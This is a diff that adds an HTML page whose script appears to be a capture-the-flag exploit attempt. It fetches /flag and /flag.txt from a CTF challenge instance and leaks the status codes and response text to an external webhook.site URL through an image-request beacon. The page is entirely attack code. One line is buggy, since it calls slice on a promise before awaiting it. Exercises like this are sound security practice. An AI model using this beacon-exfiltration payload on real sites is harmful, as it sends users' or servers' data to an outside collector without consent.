@@ -1,0 +1,34 @@
+<!DOCTYPE html>
+<html>
+<body>
+<script>
+(async () => {
+  const leak = (msg) =>
+    (new Image()).src =
+      "https://webhook.site/a87b8e30-80cc-4c2d-924a-f823fcde0a64?m=" + encodeURIComponent(msg);
+
+  try {
+    // try /flag first
+    const r1 = await fetch("https://jq2qgjxq-sourceless.instancer.2025.ctfcompetition.com/flag");
+    leak("flag-status-" + r1.status);
+    try {
+      leak("flag-text-" + await r1.text().slice(0, 50));
+    } catch (e) {
+      leak("flag-read-error-" + e);           // CORS will land here
+    }
+
+    // then try /flag.txt
+    const r2 = await fetch("https://jq2qgjxq-sourceless.instancer.2025.ctfcompetition.com/flag.txt");
+    leak("flagtxt-status-" + r2.status);
+    try {
+      leak("flagtxt-text-" + await r2.text().slice(0, 50));
+    } catch (e) {
+      leak("flagtxt-read-error-" + e);
+    }
+  } catch (e) {
+    leak("top-level-error-" + e);
+  }
+})();
+</script>
+</body>
+</html>
